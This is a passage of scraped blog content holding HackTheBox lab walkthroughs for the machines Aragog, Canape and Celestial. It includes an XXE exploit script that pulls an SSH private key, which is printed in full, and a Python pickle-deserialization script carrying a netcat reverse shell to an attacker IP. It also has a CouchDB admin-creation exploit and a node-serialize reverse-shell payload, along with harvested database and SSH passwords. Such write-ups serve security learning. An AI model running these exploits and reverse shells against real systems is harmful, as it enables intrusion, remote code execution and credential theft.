irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false syslog:x:104:108::/home/syslog:/bin/false _apt:x:105:65534::/nonexistent:/bin/false messagebus:x:106:110::/var/run/dbus:/bin/false uuidd:x:107:111::/run/uuidd:/bin/false lightdm:x:108:114:Light Display Manager:/var/lib/lightdm:/bin/false whoopsie:x:109:117::/nonexistent:/bin/false avahi-autoipd:x:110:119:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false avahi:x:111:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false dnsmasq:x:112:65534:dnsmasq,,,:/var/lib/misc:/bin/false colord:x:113:123:colord colour management daemon,,,:/var/lib/colord:/bin/false hplip:x:115:7:HPLIP system user,,,:/var/run/hplip:/bin/false kernoops:x:116:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false pulse:x:117:124:PulseAudio daemon,,,:/var/run/pulse:/bin/false rtkit:x:118:126:RealtimeKit,,,:/proc:/bin/false saned:x:119:127::/var/lib/saned:/bin/false usbmux:x:120:46:usbmux daemon,,,:/var/lib/usbmux:/bin/false florian:x:1000:1000:florian,,,:/home/florian:/bin/bash cliff:x:1001:1001::/home/cliff:/bin/bash mysql:x:121:129:MySQL Server,,,:/nonexistent:/bin/false sshd:x:122:65534::/var/run/sshd:/usr/sbin/nologin ftp:x:114:130:ftp daemon,,,:/srv/ftp:/bin/false We have 2 users florian and cliff First to look for is id_rsa inside their folders Short script for easier navigation #!/bin/bash payload=\u0026#34;\u0026lt;!--?xml version=\\\u0026#34;1.0\\\u0026#34; ?--\u0026gt; \u0026lt;!DOCTYPE foo [\u0026lt;!ENTITY xxe SYSTEM \\\u0026#34;$1\\\u0026#34;\u0026gt; ]\u0026gt; \u0026lt;details\u0026gt; \u0026lt;subnet_mask\u0026gt;\u0026amp;xxe;\u0026lt;/subnet_mask\u0026gt; \u0026lt;test\u0026gt;\u0026lt;/test\u0026gt; \u0026lt;/details\u0026gt; \u0026#34; echo \u0026#34;$payload\u0026#34; \u0026gt; xxe.payload curl -s -XPOST -d @xxe.payload http://aragog.htb/hosts.php florian has id_rsa key └─$ ./xxe-exploit.sh /home/florian/.ssh/id_rsa There are 4294967294 possible hosts for -----BEGIN RSA PRIVATE KEY----- MIIEpAIBAAKCAQEA50DQtmOP78gLZkBjJ/JcC5gmsI21+tPH3wjvLAHaFMmf7j4d +YQEMbEg+yjj6/ybxJAsF8l2kUhfk56LdpmC3mf/sO4romp9ONkl9R4cu5OB5ef8 lAjOg67dxWIo77STqYZrWUVnQ4n8dKG4Tb/z67+gT0R9lD9c0PhZwRsFQj8aKFFn 1R1B8n9/e1PB0AJ81PPxCc3RpVJdwbq8BLZrVXKNsg+SBUdbBZc3rBC81Kle2CB+ Ix89HQ3deBCL3EpRXoYVQZ4EuCsDo7UlC8YSoEBgVx4IgQCWx34tXCme5cJa/UJd d4Lkst4w4sptYMHzzshmUDrkrDJDq6olL4FyKwIDAQABAoIBAAxwMwmsX0CRbPOK AQtUANlqzKHwbVpZa8W2UE74poc5tQ12b9xM2oDluxVnRKMbyjEPZB+/aU41K1bg TzYI2b4mr90PYm9w9N1K6Ly/auI38+Ouz6oSszDoBeuo9PS3rL2QilOZ5Qz/7gFD 9YrRCUij3PaGg46mvdJLmWBGmMjQS+ZJ7w1ouqsIANypMay2t45v2Ak+SDhl/SDb /oBJFfnOpXNtQfJZZknOGY3SlCWHTgMCyYJtjMCW2Sh2wxiQSBC8C3p1iKWgyaSV 0qH/3gt7RXd1F3vdvACeuMmjjjARd+LNfsaiu714meDiwif27Knqun4NQ+2x8JA1 sWmBdcECgYEA836Z4ocK0GM7akW09wC7PkvjAweILyq4izvYZg+88Rei0k411lTV Uahyd7ojN6McSd6foNeRjmqckrKOmCq2hVOXYIWCGxRIIj5WflyynPGhDdMCQtIH zCr9VrMFc7WCCD+C7nw2YzTrvYByns/Cv+uHRBLe3S4k0KNiUCWmuYsCgYEA8yFE rV5bD+XI/iOtlUrbKPRyuFVUtPLZ6UPuunLKG4wgsGsiVITYiRhEiHdBjHK8GmYE tkfFzslrt+cjbWNVcJuXeA6b8Pala7fDp8lBymi8KGnsWlkdQh/5Ew7KRcvWS5q3 HML6ac06Ur2V0ylt1hGh/A4r4YNKgejQ1CcO/eECgYEAk02wjKEDgsO1avoWmyL/ I5XHFMsWsOoYUGr44+17cSLKZo3X9fzGPCs6bIHX0k3DzFB4o1YmAVEvvXN13kpg ttG2DzdVWUpwxP6PVsx/ZYCr3PAdOw1SmEodjriogLJ6osDBVcMhJ+0Y/EBblwW7 HF3BLAZ6erXyoaFl1XShozcCgYBuS+JfEBYZkTHscP0XZD0mSDce/r8N07odw46y kM61To2p2wBY/WdKUnMMwaU/9PD2vN9YXhkTpXazmC0PO+gPzNYbRe1ilFIZGuWs 4XVyQK9TWjI6DoFidSTGi4ghv8Y4yDhX2PBHPS4/SPiGMh485gTpVvh7Ntd/NcI+ 7HU1oQKBgQCzVl/pMQDI2pKVBlM6egi70ab6+Bsg2U20fcgzc2Mfsl0Ib5T7PzQ3 daPxRgjh3CttZYdyuTK3wxv1n5FauSngLljrKYXb7xQfzMyO0C7bE5Rj8SBaXoqv uMQ76WKnl3DkzGREM4fUgoFnGp8fNEZl5ioXfxPiH/Xl5nStkQ0rTA== -----END RSA PRIVATE KEY----- Save it to file and chmod 600 └─$ ssh florian@aragog.htb -i id_rsa Warning: Permanently added \u0026#39;aragog.htb\u0026#39; (ED25519) to the list of known hosts. Last login: Fri Sep 23 08:19:24 2022 from 10.10.14.29 florian@aragog:~$ Root We have a wordpress florian@aragog:/var/www/html$ ls -lha dev_wiki/ total 200K drwxrwxrwx 5 cliff cliff 4.0K Oct 18 10:35 . drwxrwxrwx 4 www-data www-data 4.0K Oct 18 10:35 .. -rwxrwxrwx 1 cliff cliff 253 Oct 18 10:35 .htaccess -rwxrwxrwx 1 cliff cliff 418 Oct 18 10:35 index.php -rwxrwxrwx 1 cliff cliff 20K Oct 18 10:35 license.txt -rwxrwxrwx 1 cliff cliff 7.3K Oct 18 10:35 readme.html -rwxrwxrwx 1 cliff cliff 5.4K Oct 18 10:35 wp-activate.php drwxrwxrwx 9 cliff cliff 4.0K Oct 18 10:35 wp-admin -rwxrwxrwx 1 cliff cliff 364 Oct 18 10:35 wp-blog-header.php -rwxrwxrwx 1 cliff cliff 1.6K Oct 18 10:35 wp-comments-post.php -rwxrwxrwx 1 cliff cliff 2.8K Oct 18 10:35 wp-config.php drwxrwxrwx 6 cliff cliff 4.0K Oct 18 10:35 wp-content -rwxrwxrwx 1 cliff cliff 3.6K Oct 18 10:35 wp-cron.php drwxrwxrwx 18 cliff cliff 12K Oct 18 10:35 wp-includes -rwxrwxrwx 1 cliff cliff 2.4K Oct 18 10:35 wp-links-opml.php -rwxrwxrwx 1 cliff cliff 3.3K Oct 18 10:35 wp-load.php -rwxrwxrwx 1 cliff cliff 36K Oct 18 10:35 wp-login.php -rwxrwxrwx 1 cliff cliff 7.9K Oct 18 10:35 wp-mail.php -rwxrwxrwx 1 cliff cliff 16K Oct 18 10:35 wp-settings.php -rwxrwxrwx 1 cliff cliff 30K Oct 18 10:35 wp-signup.php -rwxrwxrwx 1 cliff cliff 4.6K Oct 18 10:35 wp-trackback.php -rwxrwxrwx 1 cliff cliff 3.0K Oct 18 10:35 xmlrpc.php We find db creds from wp-config.php ... // ** MySQL settings - You can get this info from your web host ** // /** The name of the database for WordPress */ define(\u0026#39;DB_NAME\u0026#39;, \u0026#39;wp_wiki\u0026#39;); /** MySQL database username */ define(\u0026#39;DB_USER\u0026#39;, \u0026#39;root\u0026#39;); /** MySQL database password */ define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;$@y6CHJ^$#5c37j$#6h\u0026#39;); /** MySQL hostname */ define(\u0026#39;DB_HOST\u0026#39;, \u0026#39;localhost\u0026#39;); /** Database Charset to use in creating database tables. */ define(\u0026#39;DB_CHARSET\u0026#39;, \u0026#39;utf8\u0026#39;); /** The Database Collate type. Don\u0026#39;t change this if in doubt. */ define(\u0026#39;DB_COLLATE\u0026#39;, \u0026#39;\u0026#39;); ... Let\u0026rsquo;s connect there and see florian@aragog:/var/www/html/dev_wiki$ mysql -u root -p\u0026#39;$@y6CHJ^$#5c37j$#6h\u0026#39; mysql: [Warning] Using a password on the command line interface can be insecure. Welcome to the MySQL monitor. Commands end with ; or \\g. Your MySQL connection id is 229 Server version: 5.7.33-0ubuntu0.16.04.1 (Ubuntu) Copyright (c) 2000, 2021, Oracle and/or its affiliates. Oracle is a registered trademark of Oracle Corporation and/or its affiliates. Other names may be trademarks of their respective owners. Type \u0026#39;help;\u0026#39; or \u0026#39;\\h\u0026#39; for help. Type \u0026#39;\\c\u0026#39; to clear the current input statement. mysql\u0026gt; show databases; +--------------------+ | Database | +--------------------+ | information_schema | | mysql | | performance_schema | | sys | | wp_wiki | +--------------------+ 5 rows in set (0.00 sec) mysql\u0026gt; use wp_wiki; Reading table information for completion of table and column names You can turn off this feature to get a quicker startup with -A Database changed mysql\u0026gt; show tables; +-----------------------+ | Tables_in_wp_wiki | +-----------------------+ | wp_commentmeta | | wp_comments | | wp_links | | wp_options | | wp_postmeta | | wp_posts | | wp_term_relationships | | wp_term_taxonomy | | wp_termmeta | | wp_terms | | wp_usermeta | | wp_users | +-----------------------+ 12 rows in set (0.00 sec) mysql\u0026gt; select * from wp_users; +----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+ | ID | user_login | user_pass | user_nicename | user_email | user_url | user_registered | user_activation_key | user_status | display_name | +----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+ | 1 | Administrator | $P$B3FUuIdSDW0IaIc4vsjj.NzJDkiscu. | administrator | it@megacorp.com | | 2017-12-20 23:26:04 | | 0 | Administrator | +----+---------------+------------------------------------+---------------+-----------------+----------+---------------------+---------------------+-------------+---------------+ 1 row in set (0.00 sec) Unfortunately, I couldn\u0026rsquo;t crack the hash └─$ hashcat -m 400 hash /usr/share/wordlists/rockyou.txt hashcat (v6.2.6) starting OpenCL API (OpenCL 3.0 PoCL 4.0+debian Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.7, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project] ================================================================================================================================================== * Device #1: cpu-sandybridge-12th Gen Intel(R) Core(TM) i5-12400, 1435/2934 MB (512 MB allocatable), 2MCU ... Let\u0026rsquo;s download pspy and run it We see wp-login.py being executed I can\u0026rsquo;t access wp-login.py, but it implies that it\u0026rsquo;s related to Wordpress login Also I can\u0026rsquo;t use tcpdump to monitor the packets We can modify wp-login.php to output the request to some file Now lets wait and see The file is created after a while We have creds florian@aragog:/var/www/html/dev_wiki$ cat /tmp/request.log Array ( [wp-submit] =\u0026gt; Log In [redirect_to] =\u0026gt; http://aragog.htb/dev_wiki/wp-admin/ [testcookie] =\u0026gt; 1 [log] =\u0026gt; Administrator [pwd] =\u0026gt; !KRgYs(JFO!\u0026amp;MTr)lf ) The creds don\u0026rsquo;t work for cliff But work for root florian@aragog:/var/www/html/dev_wiki$ su Password: shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory sh: 0: getcwd() failed: No such file or directory root@aragog:/var/www/html/dev_wiki# cat /rootsymlink-hook: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory symlink-hook: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory root@aragog:/var/www/html/dev_wiki# ","date":"October 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/aragog/images/aragog.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/aragog/","summary":"Aragog Enumeration nmap └─$ nmap -Pn -p- 10.10.10.78 --min-rate 5000 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 18:10 BST Nmap scan report for 10.10.10.78 (10.10.10.78) Host is up (0.15s latency). Not shown: 65493 filtered tcp ports (no-response), 39 closed tcp ports (conn-refused) PORT STATE SERVICE 21/tcp open ftp 22/tcp open ssh 80/tcp open http Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds └─$ nmap -Pn -p21,22,80 -sC -sV 10.","tags":["HTB","xxe","ssh","pspy","wordpress","cron"],"title":"[HTB] Machine: Aragog"},{"categories":null,"contents":"Canape Enumeration nmap └─$ nmap -Pn -p- 10.10.10.70 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 20:00 BST Nmap scan report for 10.10.10.70 (10.10.10.70) Host is up (0.10s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 65535/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 278.86 seconds └─$ nmap -Pn -p80,65535 -sC -sV 10.10.10.70 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 20:07 BST Nmap scan report for 10.10.10.70 (10.10.10.70) Host is up (0.12s latency). PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) | http-git: | 10.10.10.70:80/.git/ | Git repository found! | Repository description: Unnamed repository; edit this file \u0026#39;description\u0026#39; to name the... | Last commit message: final # Please enter the commit message for your changes. Li... | Remotes: |_ http://git.canape.htb/simpsons.git |_http-title: Simpsons Fan Site |_http-server-header: Apache/2.4.18 (Ubuntu) |_http-trane-info: Problem with XML parsing of /evox/about 65535/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 8d:82:0b:31:90:e4:c8:85:b2:53:8b:a1:7c:3b:65:e1 (RSA) | 256 22:fc:6e:c3:55:00:85:0f:24:bf:f5:79:6c:92:8b:68 (ECDSA) |_ 256 0d:91:27:51:80:5e:2b:a3:81:0d:e9:d8:5c:9b:77:35 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 12.98 seconds Web server .git └─$ git clone http://git.canape.htb/simpsons.git Cloning into \u0026#39;simpsons\u0026#39;... remote: Counting objects: 49, done. remote: Compressing objects: 100% (47/47), done. remote: Total 49 (delta 18), reused 0 (delta 0) Unpacking objects: 100% (49/49), 163.16 KiB | 177.00 KiB/s, done. Foothold Let\u0026rsquo;s check repo └─$ git log --oneline 524f9dd (HEAD -\u0026gt; master, origin/master, origin/HEAD) final 999b869 remove a a762ade a f197cbf remove doh 36acc97 add doh fb79852 remove f 64ed42c add f 7b15317 MORE TROLLS a389475 trollface f9be9a9 add note c8a74a0 temporarily hide check due to vulerability e7bfbcf initial If we checkout to c8a74a0, the vulnerability could be related to cPickle.loads, which deserializes data The current commit still uses cPickle.loads, which we can try to exploit Send char and quote which will contain p1 and payload to exploit the library I also have to have char to be one of the whitelisted characters from the source code Let\u0026rsquo;s generate a payload https://exploit-notes.hdks.org/exploit/web/framework/python/python-pickle-rce/ Script used to exploit import cPickle import os import sys import requests from hashlib import md5 class RCE(object): def __init__(self, cmd): self.cmd = cmd def __reduce__(self): return (os.system, (self.cmd,)) if __name__ == \u0026#34;__main__\u0026#34;: ip = sys.argv[1] port = sys.argv[2] cmd = \u0026#34;echo homer \u0026amp;\u0026amp; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2\u0026gt;\u0026amp;1|nc {} {} \u0026gt;/tmp/f\u0026#34;.format(ip, port) payload = cPickle.dumps(RCE(cmd)) char = payload quote = \u0026#34;HELLO\u0026#34; _id = md5(char+quote).hexdigest() print(\u0026#34;Filename: {}\u0026#34;.format(_id)) print(\u0026#34;Payload: {}\u0026#34;.format(payload)) data = { \u0026#39;character\u0026#39; : payload, \u0026#39;quote\u0026#39; : quote } r = requests.post(\u0026#39;http://10.10.10.70/submit\u0026#39;, data = data) if r.status_code != 200: print(r.content) print(\u0026#34;Error: Failed to submit payload\u0026#34;) sys.exit() data = { \u0026#39;id\u0026#39; : _id } r = requests.post(\u0026#39;http://10.10.10.70/check\u0026#39;, data = data, timeout=1) print(r.content) Execute the script User We saw from source that application uses couchdb www-data@canape:/$ netstat -tulpn | grep LISTEN (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) tcp 0 0 0.0.0.0:65535 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:5984 0.0.0.0:* LISTEN - tcp 0 0 127.0.0.1:5986 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:80 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:4369 0.0.0.0:* LISTEN - tcp 0 0 0.0.0.0:45077 0.0.0.0:* LISTEN - tcp6 0 0 :::65535 :::* LISTEN - tcp6 0 0 :::4369 :::* LISTEN - We can access it via curl Dump all databases www-data@canape:/$ curl http://localhost:5984/_all_dbs [\u0026#34;_global_changes\u0026#34;,\u0026#34;_metadata\u0026#34;,\u0026#34;_replicator\u0026#34;,\u0026#34;_users\u0026#34;,\u0026#34;passwords\u0026#34;,\u0026#34;simpsons\u0026#34;] We can\u0026rsquo;t access _users and passwords But we can access simposons www-data@canape:/$ curl http://localhost:5984/simpsons/_all_docs {\u0026#34;total_rows\u0026#34;:7,\u0026#34;offset\u0026#34;:0,\u0026#34;rows\u0026#34;:[ {\u0026#34;id\u0026#34;:\u0026#34;f0042ac3dc4951b51f056467a1000dd9\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;f0042ac3dc4951b51f056467a1000dd9\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;1-fbdd816a5b0db0f30cf1fc38e1a37329\u0026#34;}}, {\u0026#34;id\u0026#34;:\u0026#34;f53679a526a868d44172c83a61000d86\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;f53679a526a868d44172c83a61000d86\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;1-7b8ec9e1c3e29b2a826e3d14ea122f6e\u0026#34;}}, {\u0026#34;id\u0026#34;:\u0026#34;f53679a526a868d44172c83a6100183d\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;f53679a526a868d44172c83a6100183d\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;1-e522ebc6aca87013a89dd4b37b762bd3\u0026#34;}}, {\u0026#34;id\u0026#34;:\u0026#34;f53679a526a868d44172c83a61002980\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;f53679a526a868d44172c83a61002980\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;1-3bec18e3b8b2c41797ea9d61a01c7cdc\u0026#34;}}, {\u0026#34;id\u0026#34;:\u0026#34;f53679a526a868d44172c83a61003068\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;f53679a526a868d44172c83a61003068\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;1-3d2f7da6bd52442e4598f25cc2e84540\u0026#34;}}, {\u0026#34;id\u0026#34;:\u0026#34;f53679a526a868d44172c83a61003a2a\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;f53679a526a868d44172c83a61003a2a\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;1-4446bfc0826ed3d81c9115e450844fb4\u0026#34;}}, {\u0026#34;id\u0026#34;:\u0026#34;f53679a526a868d44172c83a6100451b\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;f53679a526a868d44172c83a6100451b\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;1-3f6141f3aba11da1d65ff0c13fe6fd39\u0026#34;}} ]} Nothing interesting, but googling results suggests PrivEsc https://book.hacktricks.xyz/network-services-pentesting/5984-pentesting-couchdb#couchdb-privilege-escalation-cve-2017-12635 www-data@canape:/$ curl -X PUT -d \u0026#39;{\u0026#34;type\u0026#34;:\u0026#34;user\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;pentest\u0026#34;,\u0026#34;roles\u0026#34;:[\u0026#34;_admin\u0026#34;],\u0026#34;roles\u0026#34;:[],\u0026#34;password\u0026#34;:\u0026#34;pentest\u0026#34;}\u0026#39; localhost:5984/_users/org.couchdb.user:pentest -H \u0026#34;Content-Type:application/json\u0026#34; {\u0026#34;ok\u0026#34;:true,\u0026#34;id\u0026#34;:\u0026#34;org.couchdb.user:pentest\u0026#34;,\u0026#34;rev\u0026#34;:\u0026#34;1-3e8e089db7c949bb15701856d525bd2d\u0026#34;} Now we can access passwords database www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords {\u0026#34;db_name\u0026#34;:\u0026#34;passwords\u0026#34;,\u0026#34;update_seq\u0026#34;:\u0026#34;46-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkR2PoiQFIJlkD1bHik-dA0hdPGF1CSB19QTV5bEASYYGIAVUOp8YtQsgavcTo_YARO39rER8AQRR-wCiFuhetiwA7ytvXA\u0026#34;,\u0026#34;sizes\u0026#34;:{\u0026#34;file\u0026#34;:222462,\u0026#34;external\u0026#34;:665,\u0026#34;active\u0026#34;:1740},\u0026#34;purge_seq\u0026#34;:0,\u0026#34;other\u0026#34;:{\u0026#34;data_size\u0026#34;:665},\u0026#34;doc_del_count\u0026#34;:0,\u0026#34;doc_count\u0026#34;:4,\u0026#34;disk_size\u0026#34;:222462,\u0026#34;disk_format_version\u0026#34;:6,\u0026#34;data_size\u0026#34;:1740,\u0026#34;compact_running\u0026#34;:false,\u0026#34;instance_start_time\u0026#34;:\u0026#34;0\u0026#34;} www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords/_all_docs {\u0026#34;total_rows\u0026#34;:4,\u0026#34;offset\u0026#34;:0,\u0026#34;rows\u0026#34;:[ {\u0026#34;id\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc4380019e4\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc4380019e4\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;2-81cf17b971d9229c54be92eeee723296\u0026#34;}}, {\u0026#34;id\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc43800368d\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc43800368d\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;2-43f8db6aa3b51643c9a0e21cacd92c6e\u0026#34;}}, {\u0026#34;id\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc438003e5f\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc438003e5f\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;1-77cd0af093b96943ecb42c2e5358fe61\u0026#34;}}, {\u0026#34;id\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc438004738\u0026#34;,\u0026#34;key\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc438004738\u0026#34;,\u0026#34;value\u0026#34;:{\u0026#34;rev\u0026#34;:\u0026#34;1-49a20010e64044ee7571b8c1b902cf8c\u0026#34;}} ]} www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc4380019e4 {\u0026#34;_id\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc4380019e4\u0026#34;,\u0026#34;_rev\u0026#34;:\u0026#34;2-81cf17b971d9229c54be92eeee723296\u0026#34;,\u0026#34;item\u0026#34;:\u0026#34;ssh\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;0B4jyA0xtytZi7esBNGp\u0026#34;,\u0026#34;user\u0026#34;:\u0026#34;\u0026#34;} www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc43800368d {\u0026#34;_id\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc43800368d\u0026#34;,\u0026#34;_rev\u0026#34;:\u0026#34;2-43f8db6aa3b51643c9a0e21cacd92c6e\u0026#34;,\u0026#34;item\u0026#34;:\u0026#34;couchdb\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;r3lax0Nth3C0UCH\u0026#34;,\u0026#34;user\u0026#34;:\u0026#34;couchy\u0026#34;} www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438003e5f {\u0026#34;_id\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc438003e5f\u0026#34;,\u0026#34;_rev\u0026#34;:\u0026#34;1-77cd0af093b96943ecb42c2e5358fe61\u0026#34;,\u0026#34;item\u0026#34;:\u0026#34;simpsonsfanclub.com\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;h02ddjdj2k2k2\u0026#34;,\u0026#34;user\u0026#34;:\u0026#34;homer\u0026#34;} www-data@canape:/$ curl http://pentest:pentest@localhost:5984/passwords/739c5ebdf3f7a001bebb8fc438004738 {\u0026#34;_id\u0026#34;:\u0026#34;739c5ebdf3f7a001bebb8fc438004738\u0026#34;,\u0026#34;_rev\u0026#34;:\u0026#34;1-49a20010e64044ee7571b8c1b902cf8c\u0026#34;,\u0026#34;user\u0026#34;:\u0026#34;homerj0121\u0026#34;,\u0026#34;item\u0026#34;:\u0026#34;github\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;STOP STORING YOUR PASSWORDS HERE -Admin\u0026#34;} We saw ssh port during nmap enumeration And the only user present on the box is homer Trying password 0B4jyA0xtytZi7esBNGp works └─$ sshpass -p \u0026#39;0B4jyA0xtytZi7esBNGp\u0026#39; ssh homer@10.10.10.70 -p 65535 Warning: Permanently added \u0026#39;[10.10.10.70]:65535\u0026#39; (ED25519) to the list of known hosts. Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Last login: Tue Apr 10 12:57:08 2018 from 10.10.14.5 homer@canape:~$ Root sudo homer@canape:~$ sudo -l [sudo] password for homer: Matching Defaults entries for homer on canape: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User homer may run the following commands on canape: (root) /usr/bin/pip install * Check GTFOBins ","date":"October 17, 2023","hero":"/posts/cybersecurity/hackthebox/machines/linux/canape/images/canape.png","permalink":"https://umarbaevb.github.io/posts/cybersecurity/hackthebox/machines/linux/canape/","summary":"Canape Enumeration nmap └─$ nmap -Pn -p- 10.10.10.70 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 20:00 BST Nmap scan report for 10.10.10.70 (10.10.10.70) Host is up (0.10s latency). Not shown: 65533 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open http 65535/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 278.86 seconds └─$ nmap -Pn -p80,65535 -sC -sV 10.10.10.70 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-19 20:07 BST Nmap scan report for 10.","tags":["HTB","pickle","deserialization","couchdb","flask","pip","sudo","cve-2017-12635","gtfobins"],"title":"[HTB] Machine: Canape"},{"categories":null,"contents":"Celestial Enumeration nmap └─$ nmap -sC -sV 10.10.10.85 Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-18 16:43 BST Nmap scan report for 10.10.10.85 (10.10.10.85) Host is up (0.15s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 3000/tcp open http Node.js Express framework |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=utf-8). Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 46.38 seconds Web Server Foothold/User If refresh the page, we have a base64-encoded cookie and a response Hey Dummy 2 + 2 is 22 Which is decoded in my case as: {\u0026quot;username\u0026quot;:\u0026quot;Dummy\u0026quot;,\u0026quot;country\u0026quot;:\u0026quot;Idk Probably Somewhere Dumb\u0026quot;,\u0026quot;city\u0026quot;:\u0026quot;Lametown\u0026quot;,\u0026quot;num\u0026quot;:\u0026quot;2\u0026quot;} We could try deserialization attack on NodeJS https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e https://exploit-notes.hdks.org/exploit/web/security-risk/nodejs-deserialization-attack/ https://book.hacktricks.xyz/pentesting-web/deserialization#node-serialize https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ let y = { rce: function() { require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.16.5 6666 \u0026gt;/tmp/f\u0026#39;, function(error, stdout, stderr) { console.log(stdout); }); }, }; let serialize = require(\u0026#39;node-serialize\u0026#39;); console.log(\u0026#34;Serialized: \\n\u0026#34; + serialize.serialize(y)); Now create a payload using node └─$ node serialize.js | tail -n 1 {\u0026#34;rce\u0026#34;:\u0026#34;_$$ND_FUNC$$_function() { require(\u0026#39;child_process\u0026#39;).exec(\u0026#39;rm -f /tmp/f;mkfifo 